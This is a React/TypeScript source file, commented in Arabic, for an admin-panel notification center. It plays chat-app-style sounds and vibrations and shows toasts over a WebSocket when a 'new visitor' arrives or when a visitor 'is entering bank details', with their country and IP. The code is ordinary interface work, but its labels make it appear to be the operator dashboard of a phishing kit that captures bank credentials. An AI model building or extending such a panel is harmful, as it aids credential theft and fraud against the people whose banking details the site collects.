// مركز الإشعارات الصوتية للوحة الإدارة
import { useState, useEffect, useRef, useCallback } from "react";
import { Bell, Volume2, VolumeX, Vibrate, UserPlus, Lock, X, Check } from "lucide-react";

interface AdminNotification {
  id: string;
  type: "new_visitor" | "credentials_enter";
  country: string | null;
  ip: string | null;
  time: Date;
  read: boolean;
}

// ======= AudioContext مشترك وحيد طوال عمر الصفحة =======

let _sharedCtx: AudioContext | null = null;

function getAudioCtx(): AudioContext | null {
  if (_sharedCtx && _sharedCtx.state !== "closed") return _sharedCtx;
  try {
    _sharedCtx = new (
      window.AudioContext ||
      (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext
    )();
    return _sharedCtx;
  } catch {
    return null;
  }
}

// إلغاء تعليق AudioContext عند أول تفاعل من المستخدم
function unlockAudio() {
  const ctx = getAudioCtx();
  if (ctx && ctx.state === "suspended") {
    ctx.resume().catch(() => {});
  }
}

if (typeof document !== "undefined") {
  ["click", "keydown", "touchstart", "mousedown"].forEach((evt) =>
    document.addEventListener(evt, unlockAudio, { once: false, capture: true, passive: true })
  );
}

// صوت واتس‌آب: نبضتان صاعدتان
async function playWhatsApp() {
  const ctx = getAudioCtx();
  if (!ctx) return;
  if (ctx.state === "suspended") {
    try { await ctx.resume(); } catch { return; }
  }
  [0, 0.16].forEach((offset, i) => {
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.type = "sine";
    osc.frequency.value = i === 0 ? 1318 : 1568;
    gain.gain.setValueAtTime(0, ctx.currentTime + offset);
    gain.gain.linearRampToValueAtTime(0.38, ctx.currentTime + offset + 0.012);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + offset + 0.22);
    osc.start(ctx.currentTime + offset);
    osc.stop(ctx.currentTime + offset + 0.25);
  });
}

// صوت ماسنجر: "بوب + دينج" الكلاسيكي
async function playMessenger() {
  const ctx = getAudioCtx();
  if (!ctx) return;
  if (ctx.state === "suspended") {
    try { await ctx.resume(); } catch { return; }
  }
  const osc1 = ctx.createOscillator();
  const gain1 = ctx.createGain();
  osc1.connect(gain1);
  gain1.connect(ctx.destination);
  osc1.type = "sine";
  osc1.frequency.setValueAtTime(880, ctx.currentTime);
  osc1.frequency.exponentialRampToValueAtTime(440, ctx.currentTime + 0.09);
  gain1.gain.setValueAtTime(0.48, ctx.currentTime);
  gain1.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.13);
  osc1.start(ctx.currentTime);
  osc1.stop(ctx.currentTime + 0.15);

  const osc2 = ctx.createOscillator();
  const gain2 = ctx.createGain();
  osc2.connect(gain2);
  gain2.connect(ctx.destination);
  osc2.type = "sine";
  osc2.frequency.value = 1047;
  gain2.gain.setValueAtTime(0, ctx.currentTime + 0.13);
  gain2.gain.linearRampToValueAtTime(0.32, ctx.currentTime + 0.17);
  gain2.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.85);
  osc2.start(ctx.currentTime + 0.13);
  osc2.stop(ctx.currentTime + 0.9);
}

// ======= مكوّن مركز الإشعارات =======

export default function AdminNotificationCenter() {
  const [notifications, setNotifications] = useState<AdminNotification[]>([]);
  const [toasts, setToasts] = useState<AdminNotification[]>([]);
  const [panelOpen, setPanelOpen] = useState(false);
  const [muteSound, setMuteSound] = useState(() => localStorage.getItem("adminMuteSound") === "1");
  const [muteVibration, setMuteVibration] = useState(() => localStorage.getItem("adminMuteVibration") === "1");
  const wsRef = useRef<WebSocket | null>(null);
  const panelRef = useRef<HTMLDivElement>(null);
  const muteSoundRef = useRef(muteSound);
  muteSoundRef.current = muteSound;
  const muteVibrationRef = useRef(muteVibration);
  muteVibrationRef.current = muteVibration;

  const unreadCount = notifications.filter(n => !n.read).length;

  // إضافة إشعار جديد وتشغيل الصوت والاهتزاز
  const addNotification = useCallback((type: AdminNotification["type"], data: { country?: string | null; ipAddress?: string | null }) => {
    const notif: AdminNotification = {
      id: `${Date.now()}_${Math.random().toString(36).slice(2)}`,
      type,
      country: data.country || null,
      ip: data.ipAddress || null,
      time: new Date(),
      read: false,
    };

    setNotifications(prev => [notif, ...prev].slice(0, 50));
    setToasts(prev => [...prev, notif]);

    // تشغيل الصوت — يعمل بعد أول تفاعل مع الصفحة
    if (!muteSoundRef.current) {
      try {
        if (type === "new_visitor") playWhatsApp().catch(() => {});
        else playMessenger().catch(() => {});
      } catch {}
    }

    // الاهتزاز
    if (!muteVibrationRef.current && "vibrate" in navigator) {
      try {
        if (type === "new_visitor") navigator.vibrate([80, 40, 80]);
        else navigator.vibrate([120, 60, 120, 60, 200]);
      } catch {}
    }

    // حذف التوست تلقائياً بعد 5 ثوانٍ
    setTimeout(() => {
      setToasts(prev => prev.filter(t => t.id !== notif.id));
    }, 5000);
  }, []);

  // الاتصال بـ WebSocket
  useEffect(() => {
    const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
    let ws: WebSocket;
    let reconnectTimer: ReturnType<typeof setTimeout>;

    const connect = () => {
      ws = new WebSocket(`${protocol}//${window.location.host}/api/ws`);
      wsRef.current = ws;

      ws.onmessage = (event) => {
        try {
          const msg = JSON.parse(event.data);
          if (msg.type === "new_visitor") {
            addNotification("new_visitor", msg.data || {});
          } else if (msg.type === "credentials_enter") {
            addNotification("credentials_enter", msg.data || {});
          }
        } catch {}
      };

      ws.onerror = () => {};
      ws.onclose = () => {
        reconnectTimer = setTimeout(connect, 3000);
      };
    };

    connect();
    return () => {
      clearTimeout(reconnectTimer);
      ws?.close();
    };
  }, [addNotification]);

  // حفظ إعدادات الكتم
  const toggleMuteSound = () => {
    const next = !muteSound;
    setMuteSound(next);
    localStorage.setItem("adminMuteSound", next ? "1" : "0");
  };

  const toggleMuteVibration = () => {
    const next = !muteVibration;
    setMuteVibration(next);
    localStorage.setItem("adminMuteVibration", next ? "1" : "0");
  };

  // تمييز الكل كمقروء عند فتح اللوحة
  const openPanel = () => {
    setPanelOpen(p => !p);
    if (!panelOpen) {
      setTimeout(() => {
        setNotifications(prev => prev.map(n => ({ ...n, read: true })));
      }, 300);
    }
  };

  // إغلاق اللوحة عند النقر خارجها
  useEffect(() => {
    const handler = (e: MouseEvent) => {
      if (panelRef.current && !panelRef.current.contains(e.target as Node)) {
        setPanelOpen(false);
      }
    };
    if (panelOpen) document.addEventListener("mousedown", handler);
    return () => document.removeEventListener("mousedown", handler);
  }, [panelOpen]);

  const formatTime = (date: Date) => {
    const now = new Date();
    const diff = Math.floor((now.getTime() - date.getTime()) / 1000);
    if (diff < 60) return "الآن";
    if (diff < 3600) return `منذ ${Math.floor(diff / 60)} د`;
    return date.toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit" });
  };

  return (
    <>
      {/* التوستات العائمة */}
      <div className="fixed top-4 left-4 z-[9999] flex flex-col gap-2 pointer-events-none" style={{ maxWidth: 320 }}>
        {toasts.map(toast => (
          <div
            key={toast.id}
            className="pointer-events-auto flex items-start gap-3 px-4 py-3 rounded-2xl shadow-2xl text-white text-sm animate-in slide-in-from-left-4 fade-in duration-300"
            style={{ background: toast.type === "new_visitor" ? "#25D366" : "#0084ff" }}
          >
            <div className="mt-0.5 shrink-0">
              {toast.type === "new_visitor"
                ? <UserPlus className="w-5 h-5" />
                : <Lock className="w-5 h-5" />}
            </div>
            <div className="flex-1 min-w-0">
              <p className="font-bold leading-tight">
                {toast.type === "new_visitor" ? "زائر جديد" : "إدخال بيانات بنك"}
              </p>
              <p className="text-white/80 text-xs mt-0.5 truncate">
                {toast.country || toast.ip || "مجهول"}
              </p>
            </div>
            <button
              onClick={() => setToasts(p => p.filter(t => t.id !== toast.id))}
              className="shrink-0 text-white/70 hover:text-white mt-0.5"
            >
              <X className="w-4 h-4" />
            </button>
          </div>
        ))}
      </div>

      {/* أيقونة الجرس مع اللوحة */}
      <div ref={panelRef} className="relative">
        <button
          onClick={openPanel}
          className="relative flex items-center justify-center w-9 h-9 rounded-xl hover:bg-sidebar-accent transition-colors text-sidebar-foreground/70 hover:text-sidebar-accent-foreground"
          title="الإشعارات"
        >
          <Bell className="w-5 h-5" />
          {unreadCount > 0 && (
            <span className="absolute -top-1 -left-1 min-w-[18px] h-[18px] bg-red-500 text-white text-[10px] font-black rounded-full flex items-center justify-center px-1 leading-none">
              {unreadCount > 99 ? "99+" : unreadCount}
            </span>
          )}
        </button>

        {panelOpen && (
          <div
            className="absolute left-0 top-full mt-2 w-80 bg-popover border rounded-2xl shadow-2xl overflow-hidden z-50"
            dir="rtl"
          >
            <div className="flex items-center justify-between px-4 py-3 border-b bg-muted/40">
              <span className="font-black text-sm text-foreground">الإشعارات</span>
              <div className="flex items-center gap-1">
                <button
                  onClick={toggleMuteSound}
                  title={muteSound ? "تشغيل الصوت" : "كتم الصوت"}
                  className={`p-1.5 rounded-lg transition-colors ${muteSound ? "bg-red-100 text-red-600" : "hover:bg-muted text-muted-foreground hover:text-foreground"}`}
                >
                  {muteSound ? <VolumeX className="w-4 h-4" /> : <Volume2 className="w-4 h-4" />}
                </button>
                <button
                  onClick={toggleMuteVibration}
                  title={muteVibration ? "تشغيل الاهتزاز" : "إيقاف الاهتزاز"}
                  className={`p-1.5 rounded-lg transition-colors ${muteVibration ? "bg-red-100 text-red-600" : "hover:bg-muted text-muted-foreground hover:text-foreground"}`}
                >
                  <Vibrate className="w-4 h-4" />
                </button>
                {notifications.some(n => !n.read) && (
                  <button
                    onClick={() => setNotifications(p => p.map(n => ({ ...n, read: true })))}
                    title="تمييز الكل كمقروء"
                    className="p-1.5 rounded-lg hover:bg-muted text-muted-foreground hover:text-foreground transition-colors"
                  >
                    <Check className="w-4 h-4" />
                  </button>
                )}
                <button onClick={() => setPanelOpen(false)} className="p-1.5 rounded-lg hover:bg-muted text-muted-foreground">
                  <X className="w-4 h-4" />
                </button>
              </div>
            </div>

            <div className="flex items-center gap-2 px-4 py-2 bg-muted/20 border-b text-xs text-muted-foreground">
              <span className={`flex items-center gap-1 ${muteSound ? "text-red-500" : "text-green-600"}`}>
                {muteSound ? <VolumeX className="w-3 h-3" /> : <Volume2 className="w-3 h-3" />}
                {muteSound ? "الصوت مكتوم" : "الصوت مفعّل"}
              </span>
              <span className="text-muted-foreground/40">|</span>
              <span className={`flex items-center gap-1 ${muteVibration ? "text-red-500" : "text-green-600"}`}>
                <Vibrate className="w-3 h-3" />
                {muteVibration ? "الاهتزاز متوقف" : "الاهتزاز مفعّل"}
              </span>
            </div>

            <div className="overflow-y-auto max-h-80">
              {notifications.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-10 text-muted-foreground">
                  <Bell className="w-8 h-8 mb-2 opacity-30" />
                  <p className="text-sm">لا توجد إشعارات بعد</p>
                </div>
              ) : (
                notifications.map(notif => (
                  <div
                    key={notif.id}
                    className={`flex items-start gap-3 px-4 py-3 border-b last:border-b-0 transition-colors ${notif.read ? "bg-background" : "bg-blue-50/60 dark:bg-blue-950/20"}`}
                  >
                    <div
                      className="w-9 h-9 rounded-xl flex items-center justify-center text-white shrink-0 mt-0.5"
                      style={{ background: notif.type === "new_visitor" ? "#25D366" : "#0084ff" }}
                    >
                      {notif.type === "new_visitor"
                        ? <UserPlus className="w-4 h-4" />
                        : <Lock className="w-4 h-4" />}
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-bold text-foreground leading-tight">
                        {notif.type === "new_visitor" ? "زائر جديد دخل الموقع" : "مستخدم يدخل بيانات البنك"}
                      </p>
                      <p className="text-xs text-muted-foreground mt-0.5 truncate">
                        {notif.country ? `${notif.country} — ` : ""}{notif.ip || "IP مجهول"}
                      </p>
                    </div>
                    <span className="text-xs text-muted-foreground/60 shrink-0 mt-0.5">{formatTime(notif.time)}</span>
                  </div>
                ))
              )}
            </div>

            {notifications.length > 0 && (
              <div className="px-4 py-2 border-t bg-muted/20">
                <button
                  onClick={() => setNotifications([])}
                  className="text-xs text-muted-foreground hover:text-destructive transition-colors"
                >
                  مسح كل الإشعارات
                </button>
              </div>
            )}
          </div>
        )}
      </div>
    </>
  );
}
